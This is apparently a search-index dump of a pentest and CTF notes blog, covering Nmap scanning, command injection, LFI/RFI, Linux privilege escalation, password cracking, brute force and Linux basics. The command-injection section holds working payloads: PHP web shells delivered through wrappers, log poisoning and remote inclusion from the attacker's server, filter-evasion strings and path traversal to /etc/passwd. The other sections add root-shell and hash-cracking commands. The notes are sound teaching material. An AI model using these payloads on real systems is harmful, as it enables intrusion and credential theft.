ourseves on different tools and techniques. The first step will usually be a port scanning. But in a real world environement we are first going to gather some informations. You can have more information about that on the OSINT section.Basic Port EnumerationIn CTF where you have to pwn a machine, most of the time you will only have an IP address. The first thing we would like to do is a port scanning. “But what is a port or a port scanning?”, well a port could be seen as any entrance in your house, whether it is your front/back door, windows, chimney… It can allow an attacker to get in your house (server). “So why don’t we just close them all?”, of course, if you don’t need a certain port to be open it’s a good thought to close it. But ports are often open for a reason, like, hosting a website, an FTP server, SMB shares… You can find here a list of the most common ports. As you can see they can be used for a lot of things. So if we scan all ports of a server we can know what is runing on it.Of course you can create your own port enumeration tool. But here we are going to look to already created tools.Nmap is the most famous port scanning tool but there are many other tools like Rustscan which how his name state is coded in Rust and allow us to scan all the 65K port in less than 3s. I’ll let you check Rustscan on your own because it is similar to Nmap.How to use NmapThe easier way to use command is nmap IP/HOST where you use eather the IP or the HOST you want to scan. But there are many other flags (options) that we can use : Flag Description -v Increase output verbosity -sC Run default scripts (equivalent to –script=default) -sV Probe open ports to determine service/version info -A Enable OS detection, version detection, script scanning, and traceroute --script-updatedb Update the script database If you want fast result you may want to scan for ports and then to scan ONLY those ports. You can do so by using the -p flag and separate every port by a comma like nmap -p 80,22 -sC -sV 8.8.8.8.Saving ResultsWhen performing a pentest or even during a CTF it’s a good practice to save result about what we do. Whether it is for our client or just to remember what we have done it’s important to save them. We can do so using different flags : Flag Description -oN Normal output with the .nmap file extension -oG Grepable output with the .gnmap file extension -oX XML output with the .xml file extension -oA Save the results in all formats -iL Scan all the hosts in the file provided When you get your .xml file you can generate a .html page report with the following command :xsltproc target.xml -o target.htmlScriptsWhat makes the strength of Nmap is its scripts. You can see all the Nmap scripts in its folder /usr/share/nmap/scripts/. There are many .nse files in this folder that can be used as script as follows :nmap --script=SCRIPT_NAME1,SCRIPT_NAME2,...,SCRIPT_NAMEnYou can use one or multiple scripts that you need to separate with a comma as shown above. Replace all the SCRIPT_NAMEx with the one you want to use and you can remove the .nse extension. Here is a list of several basic scripts : Category Description auth Determination of authentication credentials. broadcast Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans. brute Executes scripts that try to log in to the respective service by brute-forcing with credentials. default Default scripts executed by using the -sC option. discovery Evaluation of accessible services. dos These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services. exploit This category of scripts tries to exploit known vulnerabilities for the scanned port. external Scripts that use external services for further processing. fuzzer This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time. intrusive Intrusive scripts that could negatively affect the target system. malware Checks if some malware infects the target system. safe Defensive scripts that do not perform intrusive and destructive access. version Extension for service detection. vuln Identification of specific vulnerabilities. PerformanceWhen we need to scan a large network or are dealing with poor network bandwidth, scanning performance is crucial. We can instruct Nmap using a number of options regarding the speed (-T &lt;1-5&gt;), frequency (—min-parallelism &lt;number&gt;), timeouts (—max-rtt-timeout &lt;time&gt;), number of test packets sent simultaneously (—min-rate &lt;number&gt;), and number of retries (—max-retries &lt;number&gt;) for the scanned ports of the targets to be scanned.TimeoutsWhen Nmap transmits a packet it takes some time (Round-Trip-Time, or RTT) for the scanned port to respond. The default timeout (—min-RTT-timeout) for Nmap is typically 100ms. But we can change this value with --initial-rtt-timeout and --max-rtt-timeout. By setting an initial RTT value too low, we can miss some open port.ex:sudo nmap 8.8.8.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100msMax RetriesSetting the retry rate of the sent packets is another technique to speed up the scans (—max-retries). Nmap will stop sending packets to a port and skip it if it doesn’t receive a response after 10 tries, which is the default setting for the retry rate.ex:sudo nmap 8.8.8.0/24 -F --max-retries 0RatesOur Nmap searches are greatly accelerated if we are aware of the network capacity and can work with the rate at which packets are transmitted. Nmap is instructed to send the specified number of packets at once when the minimum rate (—min-rate &lt;number&gt;) is provided. It will make an effort to keep the rate therein.ex :sudo nmap 8.8.8.0/24 -F --min-rate 300TimingNmap provides us with six distinct timing templates (-T &lt;0-5&gt;) to employ because such settings can’t always be manually customized, as in a black-box penetration test. The degree of aggression of our scans is determined by these numbers (0–5). Additionally, if the scan is overly aggressive, security systems might block us as a result of the generated network traffic. When nothing else has been set, the standard timing template is utilized by default (-T 3). -T 0 / -T paranoid -T 1 / -T sneaky -T 2 / -T polite -T 3 / -T normal -T 4 / -T aggressive -T 5 / -T insane" }, { "title": "Notes | Command Injection", "url": "/Notes/Web/Command_Injection", "categories": "Notes, Web, Command Injection", "tags": "Command Injection, Web, Bypass", "date": "2022-08-25 00:00:00 +0200", "snippet": "Command InjectionA command injection occurs when a user input is not sanitised. A basic example can be a ping command. If a user can enter the IP of the machine and the IP is not sanitised, we could type whatever we want. We could type 127.0.0.1 but we also could type 127.0.0.1 &amp;&amp; ls. This can allow a malicious user to execute any command on the server.Local File InclusionLocal File Inclusion (LFI) is caused when an application builds a path to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at run time.Some basic LFI could be :http://SITE/index.php?SOMETHING=/etc/passwdThis can print the passwd file if the site is vulnerable to LFI. Note the SOMETHING argument. You will need to change the SOMETHING with the injectable parameter you have found. This is due to an unsanitised inculde like : include($_GET['SOMETHING']);Path traversalThe path traversal technique consists of accessing a file by traversing to the root directory.http://SITE/index.php?SOMETHING=../../../../../../../../../etc/passwd Depending on where the website is hosted on the server, you may need to use a different number of ../ If the include looks like include(\"lang_\" . $_GET['SOMETHING']); then you may need to user /../ instead of ../BlacklistingSome characters may be blacklisted and replaced. For example, this $something = str_replace('../', '', $_GET['SOMETHING']); replace the ../ by ./ so our previous ../../../etc/passwd will be replaced by ./etc/passwd.We will need to use the following payload :http://SITE/index.php?SOMETHING=....//....//....//....//....//etc/passwd You can also use URL encoding. For example, replacing ../ by %2e%2e%2f. For more URL encoding look at the Bypass Techniques part.Appended ExtensionIf you try the basic LFI technique and the URL is redirected to http://SITE/index.php?SOMETHING=/etc/passwd.php then the server append the .php extension.We can then try to navigate to :http://SITE/?SOMETHING=php://filter/read=convert.base64-encode/resource=FILE_TO_READWe can use the curl command as follows :curl http://SITE/?SOMETHING=php://filter/read=convert.base64-encode/resource=FILE_TO_READAnd then use the base64 -d command to decode it.We could also try to use the null byte %00 to get rid of the extension :http://SITE/index.php?SOMETHING=/etc/passwd%00PHP WrappersExcept WrapperWrappers allow us to execute commands, access files or URLs… Some basic example of its use is the following :http://SITE/index.php?SOMETHING=expect://idData WrapperWe have just seen how we can use the except wrapper. Now let’s take a look at the data wrapper. The following will only work if the allow_url_include is activated in the /etc/php/X.Y/apache2/php.ini file for Apache or if the allow_url_include is activated in the /etc/php/X.Y/fpm/php.ini file for Nginx.We can create a classic web shell like :echo '&lt;?php system($_GET['cmd']); ?&gt;' | base64We can now navigate to http://SITE/index.php?SOMETHING=data://text/plain;base64,BASE64_STING&amp;cmd=id. Don’t forget to change BASE64_STING to the base64 web shell we generated.Input Wrapper Same as Data Wrapper, we need to have the allow_url_include activated.We can use the cURL program. The following command will show the output for the id command but you can change it for any other command you want.curl -s -X POST --data \"&lt;?php system('id'); ?&gt;\" \"http://SITE/index.php?SOMETHING=php://input\"Apache / Nginx Log poisoningLog poisoning is a technique that we can use to execute command and print their result in the logs. You can find log files in different locations but here is a list of several of them :/var/log/apache2/access.log/var/log/nginx/access.log/var/log/sshd.log/var/log/mail/var/log/vsftpd.log/proc/self/environWe are going to take the example of an Apache log poisoning here. If we can see the logs when we go to the following URL then the server may be vulnerable to log poisoning:http://SITE/index.php?SOMETHING=/var/log/apache2/access.logWe can use the tool Burp Suite for this attack to easily and rapidly execute commands. Start the Burp proxy and intercept the request to the log file. We then CTRL+R to send it to the repeater. Change the User-Agent to &lt;?php system($_GET['cmd']); ?&gt; Navigate in the repeater to http://SITE/index.php?SOMETHING=/var/log/apache2/access.log&amp;cmd=id with the previous User-AgentRemote File InclusionRemote file inclusion (RFI) occurs when the web application downloads and executes a remote file. These remote files are usually obtained in the form of an HTTP or FTP URI as a user-supplied parameter to the web application. allow_url_fopen (activated by default) and allow_url_include should be activated python3 -m http.server 8080 or python3 -m SimpleHTTPServer 8080 First we need to launch a server here a web server.2.echo \"&lt;?php system($_GET['cmd']); ?&gt;\" &gt; shell.phpThen we create a classic web shell. You can also use pre-made web shell like this one, for example. http://SITE/index.php?SOMETHING=http://[OUR_IP]:8080/shell.php&amp;cmd=idThen we need to specify our IP and port so that the web shell is executed. Here we have executed the “id” command.If the server was on the windows machine we may have preferred a SMB share instead. We would have done the following steps :1.smbserver.py -smb2support share $(pwd)\tHere we start an SMB server. http://SITE/index.php?SOMETHING=\\\\[OUR_IP]\\share\\shell.php&amp;cmd=idBypass TechniquesWe may have to bypass several protections. We can replace some characters with their URL encoded string, with some variable… Here is an array containing several examples. Injection Operator Injection Character URL-Encoded Character Executed Command Semicolon ; %3b Both Space + %20 Both Space ${IFS} %20 Both New Line \\n %0a Both Tab \\t %09 Both Background &amp; %26 Both (second output generally shown first) Pipe | %7c Both (only second output is shown) AND &amp;&amp; %26%26 Both (only if first succeeds) OR || %7c%7c Second (only if first fails) Sub-Shell `` %60%60 Both (Linux-only) Sub-Shell $() %24%28%29 Both (Linux-only) Instead of using spaces or tabs you can use Brace Expansion. For example instead of using ls -la you can use {ls,-la}.Environment variables :LinuxYou can also select a character from the environment variables. For example, ${PATH:0:1} will act like a /. This will take the string beginning at the index 0 and take only 1 character of the PATH variable. The ; can be replaced by ${LS_COLORS:10:1} printenv can be used to print all the environment variables. With that you can customise your payload as you want.WindowsAs for the Linux example, we can do the same on a windows system. The %HOMEPATH:~x,y can be used in the same way where x and y are replaced by numbers.If you know that you are on a powershell terminal you can use it like this $env:HOMEPATH[0]. To print all environment variables in powershell you can use Get-ChildItem Env:.Character ShiftingWe can also try to pass commands to shift from a character non blacklisted to the one we want. For example, the following example will shift from ] to \\ because the \\ is on 92 and on 91 is [.``````$(tr '!-}' '\"-~'&lt;&lt;&lt;[) If you want to shift another character you can man ascii and look any character you want. You can verify that your payload is correct by putting it on your terminal. For example, echo $(tr '!-}' '\"-~'&lt;&lt;&lt;\\[) should return you the \\ character.QuotesInserting specific characters within our command that are typically ignored by command shells like Bash or PowerShell and will execute the same command as if they were not there is one very popular and simple obfuscation technique. These characters include several single-quotes, double-quotes, and a few others.You can see some examples below to execute the whoami command :w'h'o'am'i ⇔ w\"h\"o\"am\"i ⇔ whoami (linux+windows)who$@ami\t⇔ w\\ho\\am\\i ⇔ whoami (linux)who^ami\t⇔ whoami (windows)Case ManipulationDepending on the OS the server is on, we can change the case of a command ant it will understand it.On windows for example, we can change the command whoami to WhOaMi and the terminal will understand it the same.We can do the same in Linux, except that this time it’s case sensitive. “But how can we do the same trick if Linux is case sensitive ?”, well, we can use our word with upper and lower cases (non blacklisted) and replace all the upper cases by lower cases in one command like :$(tr \"[A-Z]\" \"[a-z]\"&lt;&lt;&lt;\"WhOaMi\")Reverse StringSame as upper and lower case, we can reverse a command so the server doesn’t recognise it. On Linux, we will revert our command with the following line :echo 'whoami' | revWe grab it and put it in our payload that we are going to send to the server. The payload looks like :$(rev&lt;&lt;&lt;'imaohw')On a Windows machine, we would do the same in Powershell. First we need to revert the string :\"whoami\"[-1..-20] -join ''And then put it in the payload :iex \"$('imaohw'[-1..-20] -join '')\"EncodingSame as before, we first create our modified command. Here we are going to base64 it.echo -n 'whoami' | base64Then we put it in our payload like this :bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;d2hvYW1p)On a Windows machine, we can do the same on Powershell :[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))And the final payload will be :iex \"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\"Evasion ToolsWe can use evasion tools so that they create us the strings we can directly use for command injections instead to create them manually.Bashfuscator - Linux Setup : git clone https://github.com/Bashfuscator/Bashfuscatorcd Bashfuscatorpython3 setup.py install --usercd ./bashfuscator/bin/ Usage example : ./bashfuscator -c 'cat /etc/passwd'./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1 DOSfuscation - Windows Setup :git clone https://github.com/danielbohannon/Invoke-DOSfuscation.gitcd Invoke-DOSfuscationImport-Module .\\Invoke-DOSfuscation.psd1Invoke-DOSfuscationhelp Usage :SET COMMAND type C:\\Users\\Bob\\Desktop\\flag.txtencoding1" }, { "title": "Notes | Linux Privilege Escalation", "url": "/Notes/Privilege_Escalation/Linux_PE", "categories": "Notes, Privilege Escalation, Linux_PE", "tags": "Web, Privilege Escalation, Linux_PE, Root", "date": "2022-08-25 00:00:00 +0200", "snippet": "Linux PE (Privilege Escalation)Exploiting a bug, a design defect, or a configuration oversight in an operating system or software program to acquire elevated access to resources that are typically guarded from an application or user is known as privilege escalation.As junior pentester we want to become administrator of a machine. We are not going to talk here about CVE (Common Vulnerabilities and Exposures) that are numerous and change depending of the OS, service or method of attack. We are going to talk about basic PE and this list is not exhaustive.Sudo -lWhen we get on a machine we would like to know what rights we have. For that we can type sudo -l. This command will list what we are able to run with the sudo command. The sudo command allow us to execute other commands as another user. The output can look like this:User kali may run the following commands on kali: (ALL : ALL) ALLThis output won’t appear much when you connect on a vulnerable machine but a similar one may. First, what does it mean ? The output is of the form (user:group) command. This output tells us that we can execute any command as any user or group.The output may more likely look like this :User bob may run the following commands on vulnerable: (root) /usr/bin/find Note that if the user is different from root, “bob” for example, you can use the sudo command like this : sudo -u bob commandHere we see that we can execute the find command as the root user, which is the admin on Linux.You may say “OK, that’s cool but how can the “find” command be useful in PE ?” and you will be right. How can a command that allows us to find files or directories allow us to become root ? Well, there is a wonderful website called GTFOBins where you can find a list of binaries and how to PE with them. If we go here we can see the line that will allow us to become root :sudo find . -exec /bin/sh \\; -quitThe PE can be horizontal or vertical. A horizontal PE as its name suggests, is a PE where you stay on the same level. Typically it happens when you change user (not root). And the vertical PE happens when you gain administrator or higher rights.HistoryThe history can hide sensitive information. We can find credentials, files, command executed… Depending on the shell, you are using the history may have a different name but it will basically be the same name. To know which shall you be using you can type in your terminal echo $SHELL.If you have a zsh shell (the one of kali linux), then your history file is located at ~/.zsh_history. The name will always be .YouShellName_history, so for a bash history it will be located at ~/.bash_history.SUIDThe SUID mean that you can execute a program as the owner (root for example). We can see if a file as the SUID set with ls -l because we will see an “s” instead of the “x” in the rights. We can find all the file with the SUID with the find command :find / -type f -perm -04000 -ls 2&gt;/dev/nullTo exploit the SUID we can still use GTFOBins.CronThe cron jobs are program that are executed periodically. The cron jobs can be found in the file /etc/crontabs as follows :Here we can see an uncommon file called backup.sh on the desktop of the user “alper”. Because there is only stars, it means it is executed every minute. As the image states, the five stars represent respectively minute, hour, day, month and the day of the week when the program is executed.LinpeasThere are many other vulnerabilities, and we won’t cover them all here. But if you don’t know what to do on a machine or where it can be vulnerable, you can launch linpeas.sh on it. Linpeas is a program that will list CVE, uncommon files in some directories, SUID files and much more. It uses a colour code to tell you if information is relevant or not. As you can see on the screenshot below, we see that things highlight and red have 95% chance to allow us to PE, red things may be interesting…Exploit DBIf you are looking for an exploit or a specific CVE, there is a good chance the you can find it on the Exploit DB website.Futher readingsThere are many websites that will go into detail about some vulnerabilities like those :HackTricksHacking Articles…" }, { "title": "Notes | Password Cracking", "url": "/Notes/Brute_Force/Password_Cracking", "categories": "Notes, Brute Force", "tags": "Brute Force, Passwords, Credentials, Cracking", "date": "2022-08-25 00:00:00 +0200", "snippet": "Password CrackingWe are now in an era where password that you will find will not be in clear text and ready to use (most of the time). They will be “hashed”. You may have heard terms like “hash”, “hash functions”, “cracking a hash”… But what does it mean ? First of all, what is a hash function ? A hash function is, as its name suggests, a mathematical function that generates a string (list of characters). This generated string is called a hash. Let’s call the hash function “f” and “x” is the password that we want to hash. Then we get f(x)=y where “y” is the hash. What’s cool about hashes it’s that we can’t reverse the function. This means that with “y” we can’t find “x” even if we know “f”. The other cool thing about hash functions is that whatever you put on it (our “x”), you will always have a different result. Let’s take a concrete example. MD5 is an old hash function, we are going to hash password and password1 with it :MD5(\"password\") = 5f4dcc3b5aa765d61d8327deb882cf99MD5(\"password1\") = 7c6a180b36896a0a8c02787eeafb0e4cAs you can see, we have used as input two strings that only have one difference but the two hashes are completely different. That’s why hashing function are used instead of encoding. Because we can reverse encoding.We often hear people saying “I cracked the hash” and you will tell me, “But how is it possible if we can’t reverse it?”. The first method (that you will never use) is to try any possible combination like “a”, “b”…“aa”, “ab”… This method takes too much time. What we will do instead is using a list containing many passwords that have been used by real people in the past and are likely to be used again. The word list we are going to use is called rockyou and contains 14 million passwords but we can use others depending on the country the victim is and/or create our own wordlists. The rockyou file is located at /usr/share/wordlists/rockyou.txt. If you haven’t a .txt file you may have a .tar.gz file that you can unzip with the command tar -xf rockyou.tar.gz. You can download it from here for example. Wikipedia : “In December 2009, the RockYou company experienced a data breach resulting in the exposure of over 32 million user accounts. The company used an unencrypted database to store user account data, including plaintext passwords. They also did not allow using special characters in the passwords. The hacker used a 10-year-old SQL vulnerability to gain access to the database. The company took days to notify users after the incident, and initially incorrectly reported that the breach only affected older applications when it actually affected all RockYou users.The full list of passwords exposed as a result of the breach is available in Kali Linux, and has been since its launch in 2013. Due to its easy attainability and comprehensive length, it is commonly used in dictionary attacks”HashcatOf course you can create your own python script to “crack” the hash. But here we aregoing to see how to use already available tools.Let’s beggin with hashcat which is an advanced CPU-based password recovery utility. You can install hashcat with the following command : sudo apt install hashcatThe basic hashcat command looks like this : hashcat -m MODE HASH|HASHFILE DICTIONARY. Where MODE will be a number that tells hashcat which hashing algorithm was used. HASH or HASHFILE represents the hash string or a file containing one or more hash. DICTIONARY will be our dictionary (ex: rockyou).ModeTo know which mode to use you need to know which hash algorithm was used (MD5, SHA, NTLM…). The first option will be to use already existing tools such as hash-identifier or hashid. There are many other tools that you can use but we will talk about this two here.To use hash-identifier you only need to type hash-identifier in your terminal and once it’s done you need to give a hash. Let’s use the MD5 hash of “password”:└─$ hash-identifier ######################################################################### # __ __ __ ______ _____ # # /\\ \\/\\ \\ /\\ \\ /\\__ _\\ /\\ _ `\\ # # \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\/_/\\ \\/ \\ \\ \\/\\ \\ # # \\ \\ _ \\ /'__`\\ / ,__\\ \\ \\ _ `\\ \\ \\ \\ \\ \\ \\ \\ \\ # # \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ # # \\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/ # # \\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.2 # # By Zion3R # # www.Blackploit.com # # Root@Blackploit.com # #########################################################################-------------------------------------------------- HASH: 5f4dcc3b5aa765d61d8327deb882cf99Possible Hashs:[+] MD5[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))Least Possible Hashs:[+] RAdmin v2.x[+] NTLM[+] MD4[+] MD2[+] MD5(HMAC)[+] MD4(HMAC)[+] MD2(HMAC)[+] MD5(HMAC(Wordpress))As you can see the tool tells you that the most possible hash type is MD5. Some times, this tools can give you false positive so try another hash type if the first hash type is not the good one.To use hashid you only need to type hashid HASH in your terminal. Let’s use the MD5 hash of “password”:└─$ hashid 5f4dcc3b5aa765d61d8327deb882cf99Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'[+] MD2 [+] MD5 [+] MD4 [+] Double MD5 [+] LM [+] RIPEMD-128 [+] Haval-128 [+] Tiger-128 [+] Skein-256(128) [+] Skein-512(128) [+] Lotus Notes/Domino 5 [+] Skype [+] Snefru-128 [+] NTLM [+] Domain Cached Credentials [+] Domain Cached Credentials 2 [+] DNSSEC(NSEC3) [+] RAdmin v2.x You can use the -m flag to show hashcat mode for each hash type with hashid like : hashid HASH -mWhen you know the hash type you can CTRL+F the hash name on this site to know which mode to use.The number in the first column is the hash type. You can also CTRL+F to search for patterns, for example sha512crypt always begin with $6$ so if you search for this string you will get the hash type 1800.CrackingNow that we know that MD5 is the mode 0, we can try to recover the password.└─$ hashcat -m 0 5f4dcc3b5aa765d61d8327deb882cf99 /usr/share/wordlists/rockyou.txthashcat (v6.2.5) starting&lt;SNIP&gt;Dictionary cache hit:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344385* Bytes.....: 139921507* Keyspace..: 143443855f4dcc3b5aa765d61d8327deb882cf99:password Session..........: hashcatStatus...........: CrackedHash.Mode........: 0 (MD5)Hash.Target......: 5f4dcc3b5aa765d61d8327deb882cf99Time.Started.....: Mon Aug 29 12:12:44 2022 (0 secs)Time.Estimated...: Mon Aug 29 12:12:44 2022 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 94480 H/s (0.25ms) @ Accel:512 Loops:1 Thr:1 Vec:8Recovered........: 1/1 (100.00%) DigestsProgress.........: 4096/14344385 (0.03%)Rejected.........: 0/4096 (0.00%)Restore.Point....: 0/14344385 (0.00%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: 123456 -&gt; ooooooHardware.Mon.#1..: Util: 7%Started: Mon Aug 29 12:12:38 2022Stopped: Mon Aug 29 12:12:46 2022So how you can see, the status is Cracked and the password is printed just before the big block beginning with the Session section as HASH:PASSWORDRulesCOMMING SOONJohn The RipperJust like hashcat John The Ripper also known as john is a password cracking tool. You can use john as follows:john HASHFILE or john --wordlist=WORDLIST HASHFILE. You don’t need to specify the type of hash but it’s preferable to do so because if not it will take more time. You can use it like thisjohn hash.txt --format=raw-md5 --wordlist=wordlist.txt You can install John with the following command : sudo apt install john You can see all formats with the command john --list=formats. I advise you to grep the type you are looking for like john --list=formats | grep -iF \"md5\"John can also be used to crack files protected with a password. We are going to see how to crack some.John and RSA keySSH keys can be used to connect to a server without passwords. Thank’s to this an attacker can’t connect to the server if he doesn’t have the key. To increase the security, we can add a password to the SSH key. John allows us to crack this password. python /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.hash john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash The first step put the password hash in a file called id_rsa.hash. The second step try to crack it. You can now connect to the victim machine with the command and then provide the password for the ssh key:ssh -i id_rsa user@IPUnshadowIf you arrive on a machine and can access the passwd and the shadow file, this can be leveraged to get the password of any user (if their hash can be cracked). The unshadow command is a Linux command that allows us to combine the passwd and the shadow files. It can be used like this : unshadow passwd shadow &gt; unshadowed.txt. We can now try to crack the passwords of each user with the following command :john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txtZip and RAR filesYou can encounter zip or rar files protected with a password. As for the SSH key, we will proceed in two steps. First we recover the hash of the password and then we crack it.Zipzip2john crack2.zip &gt; zip.hashesjohn zip.hashesorjohn --wordlist=wordlist.txt zip.hashesRarrar2john crack.rar &gt; zip.hashesjohn --wordlist=wordlist.txt zip.hashesMore John functionalitiesThere are many more type of files that john can crack here are some more examples :bitlocker2johndmg2johneapmd5tojohngpg2johnhccap2johnkeepass2johnputty2johnracf2johnrar2johnraw2dynauaf2johnvncpcap2johnwpapcap2johnzip2john" }, { "title": "Notes | Brute Force", "url": "/Notes/Brute_Force/Brute_Force", "categories": "Notes, Brute Force", "tags": "Web, Brute Force, Passwords, Credentials", "date": "2022-08-25 00:00:00 +0200", "snippet": "Brute ForceAccording to Wikipedia, “Brute Force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly”. It may not be effective in the real world pentest because some web site may only allow 3 or 4 invalid attempt. This can lock an account or spot and clock us.HydraHydra is a very powerful tool that can brute force a lot of services. The syntax is basically the same for every protocol (ftp, ssh, smtp…) except for the HTTP post form. Here is a very well written article about this specific syntax. For the other protocol you can use it like this :└─$ hydra -l admin -P wordlist 10.10.10.10 ftpHere we attack the host 10.10.10.10. We try to find a valid password for the user admin for the ftp server.We can replace ftp by ssh, rdp, pop3…If you don’t remember the syntax you can find a cheat sheet here.CrackMapExecThis package is a swiss army knife for pentesting Windows/Active Directory environments. From enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL’s into memory using Powershell, dumping the NTDS.dit and more.It can be used to brute force ldap, winrm, smb, ssh or mssql. It can be used like that :└─$ crackmapexec &lt;proto&gt; &lt;target-IP&gt; -u &lt;user or userlist&gt; -p &lt;password or passwordlist&gt;Ex:└─$ crackmapexec winrm 10.129.42.197 -u user.list -p password.listEvil-WinRMThis program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985).└─$ evil-winrm -i 10.10.10.10 -u user -p passwordHere user and password can either be a string or a file." }, { "title": "Notes | Linux Fondamentals", "url": "/Notes/Linux/Linux_Fondamentals", "categories": "Notes, Linux", "tags": "Linux", "date": "2022-08-24 00:00:00 +0200", "snippet": "Linux FondamentalsFirst of all, why learn Linux? Well, when it comes to computing, Linux is a very useful operating system. It has many useful tools and offers high performance on different networks, it is light, FREE and much more…You may say, “OK, now I need to use Linux but which one ? There are many distributions like Ubuntu, Debian, Arch…”. And you are right, there is a lot of distribution. But the one you chose doesn’t really matter. Personally I like to advise using Kali Linux (a debian fork), because there is a lot of tools pre-installed on it. But don’t fall for it and try leaning all the tools or worst, trying to use them without understanding what they are used for.For the next part, I’m going to assume that you have downloaded a virtual machine tool as VMWare or Virtualbox and installed Kali Linux on it here is a tuto on how to install kali on Virtualbox.Most of the time in Linux OS (Operating System), we are going to use the terminal. Which, once launched, look like this :The console / Terminal┌──(kali㉿kali)-[~/Desktop]└─$ Let’s break this down. This tells you that your current user is kali (the first one), that the host name (name of the machine) is kali (second one), that you are in the directory located at ~/Desktop and that you are a regular user (the $ sign). If you were an administrator (called root) on Linux, then you should have a # instead of the $. From now I will use the notation └─$ COMMAND. Don’t write └─$ in your terminal, just write the command.DirectoriesOn Linux, we begin the directories at the root /. There is nothing before. Any user on the machine has a “home directory” which is located at /home/username. So if your name is “bob” then your home directory is located at /home/bob. Your home directory can also be written as ~/ it’s the same as /home/username.Basic commandsCommands are what we are going to use in the terminal instead of the mouse. I’m going to show you some basic commands and useful combination but you can find cheat sheet on the internet like this one.First we may want to see what’s in our curent directory. We are going to use the ls command.└─$ lstest_dir test_fileHere we see a file and a directory. You can tell this thank’s to the name or by the colour (in the terminal you may have different colours for the files and directories). But what if we want to be sure the an object called my_directory is really a directory ? Then you can use the -l option. And I advise you to combine it with the -a option so that they show you also the hidden files. Hidden files are named like this : .name.└─$ ls -la total 20drwxr-xr-x 3 kali kali 4096 Aug 24 18:15 .drwxr-xr-x 10 kali kali 4096 Aug 24 18:14 ..-rw-r--r-- 1 kali kali 12 Aug 24 18:15 .hidden_filedrwxr-xr-x 2 kali kali 4096 Aug 24 18:14 test_dir-rw-r--r-- 1 kali kali 19 Aug 24 18:14 test_fileHere we see the line of the object called test_dir begin with a “d” which means “directory” and the line of the object test_file begin with a “-“ which means that it’s a file. We can also see the hidden file .hidden_file.You can change your position in the machine by using the cd command. First we need to clarify some notations. The ./ or . means “the curent directory” (the one we are in). ../ means the previous one. For exemple if we are in ~/ and we want to go on the desktop we should type :└─$ cd Desktop Or└─$ cd ./Desktop Or└─$ cd ~/Desktop You can use multiple ../ like ../.. to go back in two or more directoriesRightsThank’s to the -l option of the ls command you can also see the right of a file or directory. So if we skip the first character (“d” or “-“) we get something like this rw-r--r--. This can be split in 3 parts like this XXXYYYZZZ. The “X” part represents the rights for the user that owns the file. The “Y” part represents the rights for the group that owns the file. The “Z” part represents the rights for the other users on the machine.You can notice that there is either a “r”, a “w” or a “x”. They are respectively for “read” permission, “write” permission and “eXecute” permission.The user that owns the file is (here) kali (the first one) and the group is kali (the second one). Here is an article about rights in linux.FilesYou can see the content of a file with the cat command as follow :└─$ cat test_fileSome text in a fileYou can also open it in a text editor like nano, vi or vim. You use these commands like this : text_editor text_fileTo save your modification in nano we use the shortcut CTRL+O and CTRL+X to leave the text editor. For vi or vim you need to enter in insert mode by typing I. When you have finished modifying the file you need to press ESC and write :x. If you made a mistake and need to live the text editor you can use the command :qa!.Find things on the machineIf you need to find a file or directory on the machine you can use the find command as follows :└─$ find / -type f -name my_name 2&gt;/dev/nullThe / means that we want to search from the root directory. The f means that we want to look for a file (respectively “d” for a directory). You can use the -iname instead of -name if you are not sure about the case of the name (if it’s “my_name” or “mY_NaMe”) Note the 2&gt;/dev/null, this is just to redirect errors so you don’t see them and don’t overload the output.If you know a word that the file contains then you can use the grep command. the grep command is usualy used like this :└─$ grep \"word(s) to find\" file_nameBut if you don’t know in which file to look then you can use the command as follows :└─$ grep -iRl \"word(s) to find\" / 2&gt;/dev/null" } ]
